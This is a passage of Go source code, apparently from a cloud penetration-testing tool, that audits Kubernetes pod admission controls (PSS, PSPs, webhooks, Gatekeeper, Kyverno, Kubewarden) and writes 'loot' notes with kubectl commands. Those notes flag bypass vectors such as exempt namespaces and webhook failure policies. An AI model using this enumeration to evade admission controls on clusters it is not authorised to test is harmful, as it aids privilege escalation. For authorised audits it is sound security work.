		loot.Section("Polaris").Add("# Check Polaris pods:")
		loot.Section("Polaris").Add("kubectl get pods -n polaris")
		loot.Section("Polaris").Add("kubectl get pods -n fairwinds")
		loot.Section("Polaris").Add("")
		loot.Section("Polaris").Add("# Get Polaris configuration:")
		loot.Section("Polaris").Addf("kubectl get configmap polaris -n %s -o yaml", polarisConfig.Namespace)
		loot.Section("Polaris").Add("")
		loot.Section("Polaris").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Polaris").Add("# POLARIS BYPASS TECHNIQUES")
		loot.Section("Polaris").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Polaris").Add("#")
		loot.Section("Polaris").Add("# 1. Check for exemptions in config:")
		loot.Section("Polaris").Addf("kubectl get configmap polaris -n %s -o jsonpath='{.data.config\\.yaml}' | grep -A 20 exemptions", polarisConfig.Namespace)
		loot.Section("Polaris").Add("#")
		loot.Section("Polaris").Add("# 2. Webhook failure bypass:")
		loot.Section("Polaris").Add("kubectl get validatingwebhookconfiguration polaris-webhook -o yaml | grep failurePolicy")
		loot.Section("Polaris").Add("")
	}

	// Datree-specific loot
	if datreeConfig.WebhookEnabled {
		loot.Section("Datree").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Datree").Add("# DATREE ENUMERATION")
		loot.Section("Datree").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Datree").Add("")
		loot.Section("Datree").Add("# Check Datree webhook:")
		loot.Section("Datree").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", datreeConfig.WebhookName)
		loot.Section("Datree").Add("")
		loot.Section("Datree").Add("# Check Datree pods:")
		loot.Section("Datree").Add("kubectl get pods -n datree")
		loot.Section("Datree").Add("kubectl get pods --all-namespaces | grep -i datree")
		loot.Section("Datree").Add("")
		loot.Section("Datree").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Datree").Add("# DATREE BYPASS TECHNIQUES")
		loot.Section("Datree").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("Datree").Add("#")
		loot.Section("Datree").Add("# 1. Webhook failure bypass:")
		loot.Section("Datree").Addf("kubectl get validatingwebhookconfiguration %s -o yaml | grep failurePolicy", datreeConfig.WebhookName)
		loot.Section("Datree").Add("#")
		loot.Section("Datree").Add("# 2. Check for namespace exclusions:")
		loot.Section("Datree").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", datreeConfig.WebhookName)
		loot.Section("Datree").Add("")
	}

	// Gatekeeper exclusions loot (if any exist)
	if len(gatekeeperConfig.ExcludedNamespaces) > 0 {
		loot.Section("Gatekeeper").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Gatekeeper").Add("# [CRITICAL] NAMESPACE EXCLUSIONS - BYPASS VECTORS!")
		loot.Section("Gatekeeper").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Gatekeeper").Add("#")
		loot.Section("Gatekeeper").Add("# The following namespaces are EXCLUDED from Gatekeeper constraints:")
		for _, ns := range gatekeeperConfig.ExcludedNamespaces {
			loot.Section("Gatekeeper").Addf("#   - %s", ns)
		}
		loot.Section("Gatekeeper").Add("#")
		loot.Section("Gatekeeper").Add("# [ATTACK] Deploy privileged pods in excluded namespaces to bypass Gatekeeper!")
		loot.Section("Gatekeeper").Add("")
		loot.Section("Gatekeeper").Add("# Check Gatekeeper Config:")
		loot.Section("Gatekeeper").Add("kubectl get config.config.gatekeeper.sh config -o yaml")
		loot.Section("Gatekeeper").Add("")
	}

	// Sort by namespace name
	sort.SliceStable(outputRows, func(i, j int) bool {
		return outputRows[i][0] < outputRows[j][0]
	})

	// Build tables
	tables := []internal.TableFile{
		{
			Name:   "Pod-Admission-Namespaces",
			Header: headers,
			Body:   outputRows,
		},
	}

	// Add webhook table if webhooks exist
	if len(webhookRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Webhooks",
			Header: webhookHeaders,
			Body:   webhookRows,
		})
	}

	// Add PSP table if PSPs exist
	if len(pspRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-PSP",
			Header: pspHeaders,
			Body:   pspRows,
		})
	}

	// Add VAP table if VAPs exist
	if len(vapRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-VAP",
			Header: vapHeaders,
			Body:   vapRows,
		})
	}

	// Add Gatekeeper table if constraints exist
	if len(gatekeeperRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Gatekeeper",
			Header: gatekeeperHeaders,
			Body:   gatekeeperRows,
		})
	}

	// Add Kyverno table if policies exist
	if len(kyvernoRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Kyverno",
			Header: kyvernoHeaders,
			Body:   kyvernoRows,
		})
	}

	// Add Kyverno exceptions table if exceptions exist (bypass vectors!)
	if len(kyvernoExceptionRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Kyverno-Exceptions",
			Header: kyvernoExceptionHeaders,
			Body:   kyvernoExceptionRows,
		})
	}

	// Add Kubewarden table if policies exist
	if len(kubewardenRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Kubewarden",
			Header: kubewardenHeaders,
			Body:   kubewardenRows,
		})
	}

	// Add jsPolicy table if policies exist
	if len(jsPolicyRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-jsPolicy",
			Header: jsPolicyHeaders,
			Body:   jsPolicyRows,
		})
	}

	// Add Gatekeeper exclusions table if exclusions exist (bypass vectors!)
	if len(gatekeeperExclusionRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Pod-Admission-Gatekeeper-Exclusions",
			Header: gatekeeperExclusionHeaders,
			Body:   gatekeeperExclusionRows,
		})
	}

	lootFiles := loot.Build()

	err := internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Pod-Admission",
		globals.ClusterName,
		"results",
		PodAdmissionOutput{
			Table: tables,
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_POD_SECURITY_MODULE_NAME)
		return
	}

	// Count vulnerable namespaces
	noEnforcementCount := 0
	webhookBypassCount := 0
	for _, finding := range findings {
		if finding.NoEnforcement || finding.PSSEnforceLevel == "privileged" {
			noEnforcementCount++
		}
		if finding.WebhookBypassRisk == shared.RiskHigh {
			webhookBypassCount++
		}
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d namespaces analyzed (%d no enforcement, %d webhook bypass risk)", len(outputRows), noEnforcementCount, webhookBypassCount), globals.K8S_POD_SECURITY_MODULE_NAME)
		if len(webhookRows) > 0 {
			logger.InfoM(fmt.Sprintf("%d admission webhooks found", len(webhookRows)), globals.K8S_POD_SECURITY_MODULE_NAME)
		}
		if len(pspRows) > 0 {
			logger.InfoM(fmt.Sprintf("%d PSPs found (deprecated)", len(pspRows)), globals.K8S_POD_SECURITY_MODULE_NAME)
		}
	} else {
		logger.InfoM("No pod security configurations found", globals.K8S_POD_SECURITY_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_POD_SECURITY_MODULE_NAME), globals.K8S_POD_SECURITY_MODULE_NAME)
}

// analyzePodSecurityStandards analyzes PSS labels and annotations
func analyzePodSecurityStandards(ns corev1.Namespace) PSSAnalysis {
	analysis := PSSAnalysis{}

	// Check enforce mode
	if enforce, exists := ns.Labels["pod-security.kubernetes.io/enforce"]; exists {
		analysis.EnforceLevel = enforce
		if version, exists := ns.Labels["pod-security.kubernetes.io/enforce-version"]; exists {
			analysis.EnforceVersion = version
		}
	}

	// Check warn mode
	if warn, exists := ns.Labels["pod-security.kubernetes.io/warn"]; exists {
		analysis.WarnLevel = warn
		if version, exists := ns.Labels["pod-security.kubernetes.io/warn-version"]; exists {
			analysis.WarnVersion = version
		}
	}

	// Check audit mode
	if audit, exists := ns.Labels["pod-security.kubernetes.io/audit"]; exists {
		analysis.AuditLevel = audit
		if version, exists := ns.Labels["pod-security.kubernetes.io/audit-version"]; exists {
			analysis.AuditVersion = version
		}
	}

	// Check for exemptions
	if exempt, exists := ns.Labels["pod-security.kubernetes.io/exempt"]; exists {
		analysis.IsExempt = true
		analysis.ExemptReason = exempt
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("Namespace is exempt from PSS: %s", exempt))
	}

	// Risk assessment
	if analysis.EnforceLevel == "" {
		analysis.NoEnforcement = true
		analysis.RiskLevel = shared.RiskCritical
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"No PSS enforcement - accepts all pod configurations")
	} else {
		switch analysis.EnforceLevel {
		case "privileged":
			analysis.WeakEnforcement = true
			analysis.RiskLevel = shared.RiskCritical
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"PSS enforce level 'privileged' - no restrictions (equivalent to no enforcement)")
		case "baseline":
			analysis.RiskLevel = shared.RiskMedium
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"PSS baseline allows some risky configurations (hostNetwork with restrictions, unsafe sysctls)")
		case "restricted":
			analysis.RiskLevel = shared.RiskLow
		default:
			analysis.RiskLevel = shared.RiskMedium
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				fmt.Sprintf("Unknown PSS level: %s", analysis.EnforceLevel))
		}
	}

	// Check for warn/audit only (no enforcement)
	if analysis.EnforceLevel == "" && (analysis.WarnLevel != "" || analysis.AuditLevel != "") {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"PSS warn/audit mode only - pods not blocked, only logged")
	}

	return analysis
}

// analyzePSPs analyzes Pod Security Policies
func analyzePSPs(ctx context.Context, dynClient dynamic.Interface) []PSPAnalysis {
	var analyses []PSPAnalysis

	pspGVR := schema.GroupVersionResource{Group: "policy", Version: "v1beta1", Resource: "podsecuritypolicies"}
	pspList, err := dynClient.Resource(pspGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		return analyses
	}

	for _, psp := range pspList.Items {
		analysis := PSPAnalysis{
			Name:               psp.GetName(),
			RiskLevel:          shared.RiskLow,
			DeprecationWarning: "PSP is deprecated since Kubernetes 1.21 and removed in 1.25",
		}

		spec, found, _ := unstructured.NestedMap(psp.Object, "spec")
		if !found {
			continue
		}

		// Check privileged
		if privileged, _, _ := unstructured.NestedBool(spec, "privileged"); privileged {
			analysis.AllowsPrivileged = true
			analysis.RiskLevel = shared.RiskCritical
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows privileged containers (full node compromise)")
		}

		// Check hostNetwork
		if hostNetwork, _, _ := unstructured.NestedBool(spec, "hostNetwork"); hostNetwork {
			analysis.AllowsHostNetwork = true
			if analysis.RiskLevel != shared.RiskCritical {
				analysis.RiskLevel = shared.RiskHigh
			}
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows host network access (network sniffing, service impersonation)")
		}

		// Check hostPID
		if hostPID, _, _ := unstructured.NestedBool(spec, "hostPID"); hostPID {
			analysis.AllowsHostPID = true
			if analysis.RiskLevel != shared.RiskCritical {
				analysis.RiskLevel = shared.RiskHigh
			}
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows host PID namespace (process inspection, signal injection)")
		}

		// Check hostIPC
		if hostIPC, _, _ := unstructured.NestedBool(spec, "hostIPC"); hostIPC {
			analysis.AllowsHostIPC = true
			if analysis.RiskLevel != shared.RiskCritical {
				analysis.RiskLevel = shared.RiskHigh
			}
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Allows host IPC namespace (shared memory access)")
		}

		// Check allowedCapabilities
		caps, _, _ := unstructured.NestedStringSlice(spec, "allowedCapabilities")
		dangerousCaps := map[string]string{
			"SYS_ADMIN":       "Full system administration",
			"NET_ADMIN":       "Network administration",
			"SYS_PTRACE":      "Process tracing",
			"SYS_MODULE":      "Load kernel modules",
			"DAC_READ_SEARCH": "Bypass file read permission checks",
			"DAC_OVERRIDE":    "Bypass file write permission checks",
		}

		for _, cap := range caps {
			if cap == "*" {
				analysis.AllowedCapabilities = append(analysis.AllowedCapabilities, "ALL")
				analysis.RiskLevel = shared.RiskCritical
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					"Allows ALL capabilities (complete privilege escalation)")
				break
			}
			if desc, exists := dangerousCaps[cap]; exists {
				analysis.AllowedCapabilities = append(analysis.AllowedCapabilities, cap)
				analysis.RiskLevel = shared.RiskCritical
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					fmt.Sprintf("Allows dangerous capability %s: %s", cap, desc))
			}
		}

		// Check allowedHostPaths
		hostPaths, found, _ := unstructured.NestedSlice(spec, "allowedHostPaths")
		if found && len(hostPaths) > 0 {
			analysis.AllowsHostPath = true
			for _, hp := range hostPaths {
				if hpMap, ok := hp.(map[string]interface{}); ok {
					if pathPrefix, ok := hpMap["pathPrefix"].(string); ok {
						analysis.AllowedHostPaths = append(analysis.AllowedHostPaths, pathPrefix)
						if pathPrefix == "/" || strings.HasPrefix(pathPrefix, "/var/lib/kubelet") {
							analysis.RiskLevel = shared.RiskCritical
							analysis.SecurityIssues = append(analysis.SecurityIssues,
								fmt.Sprintf("Allows dangerous hostPath: %s", pathPrefix))
						}
					}
				}
			}
		}

		// Check runAsUser
		runAsUser, found, _ := unstructured.NestedMap(spec, "runAsUser")
		if found {
			if rule, ok := runAsUser["rule"].(string); ok {
				analysis.RunAsUserRule = rule
				if rule == "RunAsAny" {
					analysis.AllowsRunAsRoot = true
					if analysis.RiskLevel == shared.RiskLow {
						analysis.RiskLevel = shared.RiskMedium
					}
					analysis.SecurityIssues = append(analysis.SecurityIssues,
						"Allows running as any user including root")
				}
			}
		}

		analyses = append(analyses, analysis)
	}

	return analyses
}

// analyzeWebhooks analyzes admission webhooks
func analyzeWebhooks(ctx context.Context, dynClient dynamic.Interface, resourceType string) []WebhookInfo {
	var webhooks []WebhookInfo

	gvr := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: resourceType,
	}

	webhookList, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
	if err != nil {
		return webhooks
	}

	whType := "validating"
	if resourceType == "mutatingwebhookconfigurations" {
		whType = "mutating"
	}

	for _, wh := range webhookList.Items {
		whks, found := wh.Object["webhooks"].([]interface{})
		if !found {
			continue
		}

		for _, w := range whks {
			wMap := w.(map[string]interface{})

			// Check if targets pods
			rules, ok := wMap["rules"].([]interface{})
			if !ok {
				continue
			}

			targetsPods := false
			for _, r := range rules {
				rMap := r.(map[string]interface{})
				resources, _ := rMap["resources"].([]interface{})
				for _, res := range resources {
					if resStr, ok := res.(string); ok && resStr == "pods" {
						targetsPods = true
					}
				}
			}

			if !targetsPods {
				continue
			}

			info := WebhookInfo{
				Name: wh.GetName(),
				Type: whType,
			}

			// Check failure policy
			if failurePolicy, ok := wMap["failurePolicy"].(string); ok {
				info.FailurePolicy = failurePolicy
				if failurePolicy == "Ignore" {
					info.BypassRisk = shared.RiskHigh
					info.SecurityIssues = append(info.SecurityIssues,
						"Failure policy 'Ignore' - webhook failures don't block pods")
				}
			}

			// Check side effects
			if sideEffects, ok := wMap["sideEffects"].(string); ok {
				info.SideEffects = sideEffects
			}

			// Check timeout
			if timeout, ok := wMap["timeoutSeconds"].(int64); ok {
				info.TimeoutSeconds = int32(timeout)
				if timeout > 10 {
					info.SecurityIssues = append(info.SecurityIssues,
						fmt.Sprintf("Long timeout (%ds) - performance impact", timeout))
				}
			}

			// Check namespace selector
			if nsSelector, ok := wMap["namespaceSelector"].(map[string]interface{}); ok {
				if len(nsSelector) > 0 {
					info.NamespaceSelector = "configured"
					info.HasExclusions = true
					info.SecurityIssues = append(info.SecurityIssues,
						"Namespace selector configured - some namespaces may be excluded")
				}
			}

			webhooks = append(webhooks, info)
		}
	}

	return webhooks
}

// filterWebhooksForNamespace determines which webhooks apply to a namespace
func filterWebhooksForNamespace(webhooks []WebhookInfo, nsName string, nsLabels map[string]string) []WebhookInfo {
	var applicable []WebhookInfo

	for _, wh := range webhooks {
		// If webhook has no namespace selector, it applies to all namespaces
		if wh.NamespaceSelector == "" {
			applicable = append(applicable, wh)
		}
		// TODO: Implement actual namespace selector matching logic
	}

	return applicable
}

// analyzeValidatingAdmissionPolicies analyzes ValidatingAdmissionPolicy (K8s 1.26+)
func analyzeValidatingAdmissionPolicies(ctx context.Context, dynClient dynamic.Interface) []ValidatingAdmissionPolicyInfo {
	var policies []ValidatingAdmissionPolicyInfo

	// ValidatingAdmissionPolicy
	vapGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingadmissionpolicies",
	}

	vapList, err := dynClient.Resource(vapGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v1beta1 for older clusters
		vapGVR.Version = "v1beta1"
		vapList, err = dynClient.Resource(vapGVR).List(ctx, metav1.ListOptions{})
		if err != nil {
			return policies
		}
	}

	// Get bindings
	vapbGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingadmissionpolicybindings",
	}
	bindingsMap := make(map[string][]string)

	vapbList, err := dynClient.Resource(vapbGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		vapbGVR.Version = "v1beta1"
		vapbList, _ = dynClient.Resource(vapbGVR).List(ctx, metav1.ListOptions{})
	}

	if vapbList != nil {
		for _, binding := range vapbList.Items {
			policyName, _, _ := unstructured.NestedString(binding.Object, "spec", "policyName")
			if policyName != "" {
				bindingsMap[policyName] = append(bindingsMap[policyName], binding.GetName())
			}
		}
	}

	for _, vap := range vapList.Items {
		info := ValidatingAdmissionPolicyInfo{
			Name:     vap.GetName(),
			Bindings: bindingsMap[vap.GetName()],
		}

		// Get failure policy
		if fp, ok, _ := unstructured.NestedString(vap.Object, "spec", "failurePolicy"); ok {
			info.FailurePolicy = fp
		}

		// Extract validations and CEL expressions
		if validations, ok, _ := unstructured.NestedSlice(vap.Object, "spec", "validations"); ok {
			info.Validations = len(validations)
			// Extract CEL expressions for blocking detection
			for _, v := range validations {
				if vMap, ok := v.(map[string]interface{}); ok {
					if expr, ok := vMap["expression"].(string); ok {
						info.CELExpressions = append(info.CELExpressions, expr)
					}
				}
			}
		}

		// Count audit annotations
		if auditAnnotations, ok, _ := unstructured.NestedSlice(vap.Object, "spec", "auditAnnotations"); ok {
			info.AuditAnnotations = len(auditAnnotations)
		}

		// Get paramKind
		if paramKind, ok, _ := unstructured.NestedMap(vap.Object, "spec", "paramKind"); ok {
			if kind, ok := paramKind["kind"].(string); ok {
				info.ParamKind = kind
			}
		}

		// Get match resources summary
		if matchConstraints, ok, _ := unstructured.NestedMap(vap.Object, "spec", "matchConstraints"); ok {
			if resourceRules, ok := matchConstraints["resourceRules"].([]interface{}); ok && len(resourceRules) > 0 {
				info.MatchResources = fmt.Sprintf("%d resource rules", len(resourceRules))
			}
		}

		policies = append(policies, info)
	}

	return policies
}

// analyzeGatekeeperConstraints analyzes OPA Gatekeeper constraints
func analyzeGatekeeperConstraints(ctx context.Context, dynClient dynamic.Interface) ([]GatekeeperTemplateInfo, []GatekeeperConstraintInfo) {
	var templates []GatekeeperTemplateInfo
	var constraints []GatekeeperConstraintInfo

	// Get ConstraintTemplates
	ctGVR := schema.GroupVersionResource{
		Group:    "templates.gatekeeper.sh",
		Version:  "v1",
		Resource: "constrainttemplates",
	}

	ctList, err := dynClient.Resource(ctGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v1beta1
		ctGVR.Version = "v1beta1"
		ctList, err = dynClient.Resource(ctGVR).List(ctx, metav1.ListOptions{})
		if err != nil {
			return templates, constraints
		}
	}

	for _, ct := range ctList.Items {
		info := GatekeeperTemplateInfo{
			Name: ct.GetName(),
		}

		// Get the CRD kind it creates
		if crd, ok, _ := unstructured.NestedMap(ct.Object, "spec", "crd", "spec", "names"); ok {
			if kind, ok := crd["kind"].(string); ok {
				info.Kind = kind
			}
		}

		// Get targets and extract Rego code
		if targets, ok, _ := unstructured.NestedSlice(ct.Object, "spec", "targets"); ok {
			for _, t := range targets {
				if tMap, ok := t.(map[string]interface{}); ok {
					if target, ok := tMap["target"].(string); ok {
						info.Targets = append(info.Targets, target)
					}
					// Extract Rego code for content-based blocking detection
					if rego, ok := tMap["rego"].(string); ok {
						info.RegoContent = rego
					}
				}
			}
		}

		templates = append(templates, info)

		// Now get constraints of this type
		if info.Kind != "" {
			constraintGVR := schema.GroupVersionResource{
				Group:    "constraints.gatekeeper.sh",
				Version:  "v1beta1",
				Resource: strings.ToLower(info.Kind),
			}

			constraintList, err := dynClient.Resource(constraintGVR).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}

			for _, c := range constraintList.Items {
				cInfo := GatekeeperConstraintInfo{
					Name:        c.GetName(),
					Kind:        info.Kind,
					RegoContent: info.RegoContent, // Attach Rego from template
				}

				// Get enforcement action
				if ea, ok, _ := unstructured.NestedString(c.Object, "spec", "enforcementAction"); ok {
					cInfo.EnforcementAction = ea
				} else {
					cInfo.EnforcementAction = "deny" // default
				}

				// Get match kinds
				if match, ok, _ := unstructured.NestedMap(c.Object, "spec", "match"); ok {
					if kinds, ok := match["kinds"].([]interface{}); ok {
						cInfo.Match = fmt.Sprintf("%d kind rules", len(kinds))
					}
				}

				// Get violation count from status
				if violations, ok, _ := unstructured.NestedSlice(c.Object, "status", "violations"); ok {
					cInfo.Violations = len(violations)
				}

				constraints = append(constraints, cInfo)
			}
		}
	}

	return templates, constraints
}

// analyzeKyvernoPolicies analyzes Kyverno policies
func analyzeKyvernoPolicies(ctx context.Context, dynClient dynamic.Interface) ([]KyvernoPolicyInfo, []KyvernoExceptionInfo) {
	var policies []KyvernoPolicyInfo
	var exceptions []KyvernoExceptionInfo

	// ClusterPolicy
	cpGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v1",
		Resource: "clusterpolicies",
	}

	cpList, err := dynClient.Resource(cpGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cp := range cpList.Items {
			info := KyvernoPolicyInfo{
				Name:            cp.GetName(),
				IsClusterPolicy: true,
			}

			// Get validation failure action
			if vfa, ok, _ := unstructured.NestedString(cp.Object, "spec", "validationFailureAction"); ok {
				info.ValidationFailure = vfa
			}

			// Get background
			if bg, ok, _ := unstructured.NestedBool(cp.Object, "spec", "background"); ok {
				info.Background = bg
			}

			// Get rules and extract patterns for blocking detection
			if rules, ok, _ := unstructured.NestedSlice(cp.Object, "spec", "rules"); ok {
				info.Rules = len(rules)
				for _, r := range rules {
					if rMap, ok := r.(map[string]interface{}); ok {
						if name, ok := rMap["name"].(string); ok {
							info.RuleNames = append(info.RuleNames, name)
						}
						// Extract validate patterns for blocking detection
						if validate, ok := rMap["validate"].(map[string]interface{}); ok {
							// Convert the entire validate section to a string for pattern matching
							validateStr := fmt.Sprintf("%v", validate)
							info.RulePatterns = append(info.RulePatterns, validateStr)
						}
					}
				}
			}

			policies = append(policies, info)
		}
	}

	// Policy (namespace-scoped)
	pGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v1",
		Resource: "policies",
	}

	pList, err := dynClient.Resource(pGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, p := range pList.Items {
			info := KyvernoPolicyInfo{
				Name:            p.GetName(),
				Namespace:       p.GetNamespace(),
				IsClusterPolicy: false,
			}

			if vfa, ok, _ := unstructured.NestedString(p.Object, "spec", "validationFailureAction"); ok {
				info.ValidationFailure = vfa
			}

			if bg, ok, _ := unstructured.NestedBool(p.Object, "spec", "background"); ok {
				info.Background = bg
			}

			if rules, ok, _ := unstructured.NestedSlice(p.Object, "spec", "rules"); ok {
				info.Rules = len(rules)
				for _, r := range rules {
					if rMap, ok := r.(map[string]interface{}); ok {
						if name, ok := rMap["name"].(string); ok {
							info.RuleNames = append(info.RuleNames, name)
						}
						// Extract validate patterns for blocking detection
						if validate, ok := rMap["validate"].(map[string]interface{}); ok {
							validateStr := fmt.Sprintf("%v", validate)
							info.RulePatterns = append(info.RulePatterns, validateStr)
						}
					}
				}
			}

			policies = append(policies, info)
		}
	}

	// PolicyException (bypass vector!)
	peGVR := schema.GroupVersionResource{
		Group:    "kyverno.io",
		Version:  "v2",
		Resource: "policyexceptions",
	}

	peList, err := dynClient.Resource(peGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v2beta1
		peGVR.Version = "v2beta1"
		peList, _ = dynClient.Resource(peGVR).Namespace("").List(ctx, metav1.ListOptions{})
	}

	if peList != nil {
		for _, pe := range peList.Items {
			info := KyvernoExceptionInfo{
				Name:      pe.GetName(),
				Namespace: pe.GetNamespace(),
			}

			// Get exceptions
			if exceptions, ok, _ := unstructured.NestedSlice(pe.Object, "spec", "exceptions"); ok {
				for _, e := range exceptions {
					if eMap, ok := e.(map[string]interface{}); ok {
						if policyName, ok := eMap["policyName"].(string); ok {
							info.Policies = append(info.Policies, policyName)
						}
						if ruleNames, ok := eMap["ruleNames"].([]interface{}); ok {
							for _, rn := range ruleNames {
								if rnStr, ok := rn.(string); ok {
									info.Rules = append(info.Rules, rnStr)
								}
							}
						}
					}
				}
			}

			// Get match summary
			if match, ok, _ := unstructured.NestedMap(pe.Object, "spec", "match"); ok {
				if any, ok := match["any"].([]interface{}); ok {
					info.Match = fmt.Sprintf("%d match rules", len(any))
				} else if all, ok := match["all"].([]interface{}); ok {
					info.Match = fmt.Sprintf("%d match rules", len(all))
				}
			}

			exceptions = append(exceptions, info)
		}
	}

	return policies, exceptions
}

// analyzeKubewardenPolicies analyzes Kubewarden policies
func analyzeKubewardenPolicies(ctx context.Context, dynClient dynamic.Interface) []KubewardenPolicyInfo {
	var policies []KubewardenPolicyInfo

	// ClusterAdmissionPolicy
	capGVR := schema.GroupVersionResource{
		Group:    "policies.kubewarden.io",
		Version:  "v1",
		Resource: "clusteradmissionpolicies",
	}

	capList, err := dynClient.Resource(capGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cap := range capList.Items {
			info := KubewardenPolicyInfo{
				Name:            cap.GetName(),
				IsClusterPolicy: true,
			}

			if module, ok, _ := unstructured.NestedString(cap.Object, "spec", "module"); ok {
				info.Module = module
			}

			if mode, ok, _ := unstructured.NestedString(cap.Object, "spec", "mode"); ok {
				info.Mode = mode
			} else {
				info.Mode = "protect" // default
			}

			if mutating, ok, _ := unstructured.NestedBool(cap.Object, "spec", "mutating"); ok {
				info.Mutating = mutating
			}

			if rules, ok, _ := unstructured.NestedSlice(cap.Object, "spec", "rules"); ok {
				info.Rules = fmt.Sprintf("%d rules", len(rules))
			}

			// Extract settings for content-based blocking detection
			if settings, ok, _ := unstructured.NestedMap(cap.Object, "spec", "settings"); ok {
				info.Settings = fmt.Sprintf("%v", settings)
			}

			policies = append(policies, info)
		}
	}

	// AdmissionPolicy (namespace-scoped)
	apGVR := schema.GroupVersionResource{
		Group:    "policies.kubewarden.io",
		Version:  "v1",
		Resource: "admissionpolicies",
	}

	apList, err := dynClient.Resource(apGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, ap := range apList.Items {
			info := KubewardenPolicyInfo{
				Name:            ap.GetName(),
				Namespace:       ap.GetNamespace(),
				IsClusterPolicy: false,
			}

			if module, ok, _ := unstructured.NestedString(ap.Object, "spec", "module"); ok {
				info.Module = module
			}

			if mode, ok, _ := unstructured.NestedString(ap.Object, "spec", "mode"); ok {
				info.Mode = mode
			} else {
				info.Mode = "protect"
			}

			if mutating, ok, _ := unstructured.NestedBool(ap.Object, "spec", "mutating"); ok {
				info.Mutating = mutating
			}

			if rules, ok, _ := unstructured.NestedSlice(ap.Object, "spec", "rules"); ok {
				info.Rules = fmt.Sprintf("%d rules", len(rules))
			}

			// Extract settings for content-based blocking detection
			if settings, ok, _ := unstructured.NestedMap(ap.Object, "spec", "settings"); ok {
				info.Settings = fmt.Sprintf("%v", settings)
			}

			policies = append(policies, info)
		}
	}

	return policies
}

// analyzeGatekeeperConfig analyzes Gatekeeper Config for namespace exclusions (bypass vectors)
func analyzeGatekeeperConfig(ctx context.Context, dynClient dynamic.Interface) GatekeeperConfigInfo {
	info := GatekeeperConfigInfo{}

	configGVR := schema.GroupVersionResource{
		Group:    "config.gatekeeper.sh",
		Version:  "v1alpha1",
		Resource: "configs",
	}

	configList, err := dynClient.Resource(configGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		return info
	}

	for _, cfg := range configList.Items {
		info.Name = cfg.GetName()

		// Get excluded namespaces from spec.match
		if match, ok, _ := unstructured.NestedSlice(cfg.Object, "spec", "match"); ok {
			for _, m := range match {
				if mMap, ok := m.(map[string]interface{}); ok {
					if excludedNs, ok := mMap["excludedNamespaces"].([]interface{}); ok {
						for _, ns := range excludedNs {
							if nsStr, ok := ns.(string); ok {
								info.ExcludedNamespaces = append(info.ExcludedNamespaces, nsStr)
							}
						}
					}
				}
			}
		}

		// Get exempt images
		if validation, ok, _ := unstructured.NestedMap(cfg.Object, "spec", "validation"); ok {
			if traces, ok := validation["traces"].([]interface{}); ok {
				for _, t := range traces {
					if tMap, ok := t.(map[string]interface{}); ok {
						if exempt, ok := tMap["exemptImages"].([]interface{}); ok {
							for _, img := range exempt {
								if imgStr, ok := img.(string); ok {
									info.ExemptImages = append(info.ExemptImages, imgStr)
								}
							}
						}
					}
				}
			}
		}
	}

	return info
}

// analyzeJsPolicies analyzes jsPolicy policies
func analyzeJsPolicies(ctx context.Context, dynClient dynamic.Interface) []JsPolicyInfo {
	var policies []JsPolicyInfo

